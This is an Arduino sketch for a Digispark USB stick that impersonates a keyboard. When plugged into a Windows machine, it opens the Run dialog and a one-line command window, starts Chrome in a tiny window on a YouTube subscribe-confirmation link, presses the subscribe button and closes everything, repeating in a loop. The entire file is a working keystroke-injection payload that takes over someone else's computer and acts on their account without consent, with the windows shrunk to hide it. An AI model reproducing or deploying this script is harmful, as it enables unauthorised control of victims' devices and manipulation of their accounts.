// by 8figurealltimepro
#include "DigiKeyboard.h"
#define KEY_DOWN 0x51 // Keyboard Down Arrow
#define KEY_ENTER 0x28 //Return/Enter Key

//change the <LINK> , including < >

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
   // delayr
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1"); //smallest cmd window possible
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("start chrome --window-size=100,50 https://www.youtube.com/channel/<LINK>?sub_confirmation=1"); //open the yt channel and the subscription page
  DigiKeyboard.delay(4500);
  DigiKeyboard.write('\t');
  DigiKeyboard.delay(500);
  DigiKeyboard.write('\t');
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //subscribe
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_F4,MOD_ALT_LEFT ); //exit chrome
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("exit"); // exit cmd
  DigiKeyboard.delay(100); 

  
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
  
}
